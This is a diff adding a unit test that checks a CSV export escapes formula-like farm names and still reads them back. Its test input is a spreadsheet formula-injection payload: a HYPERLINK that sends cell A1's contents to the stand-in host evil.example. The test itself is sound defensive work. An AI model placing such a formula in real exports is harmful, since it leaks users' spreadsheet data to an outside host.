@@ -74,6 +74,17 @@ describe('inviteExampleCsv (issue #456)', () => {
 		});
 	});
 
+	it('defuses a unit name a spreadsheet would read as a formula, and still reads it back (docs/security.md § CSV exports)', () => {
+		const evil = '=HYPERLINK("https://evil.example/?"&A1,"Open")';
+		const csv = inviteExampleCsv([{ name: evil }, { name: '@SUM(1)' }]);
+		const farmCells = csv
+			.split('\r\n')
+			.slice(1, 3)
+			.map((l) => l.slice(l.indexOf(',') + 1, l.lastIndexOf(',')).replace(/^"/, ''));
+		for (const cell of farmCells) expect(cell).toMatch(/^'[=@]/);
+		expect(parseFarmerCsv(csv).rows.map((r) => r.farm)).toEqual([evil, '@SUM(1)']);
+	});
+
 	it('has one placeholder row when the project has no named units', () => {
 		expect(parseFarmerCsv(inviteExampleCsv([{ name: ' ' }])).rows).toEqual([{ line: 2, email: 'farmer1@example.com', farm: 'Hydrological unit name', locale: 'en' }]);
 	});
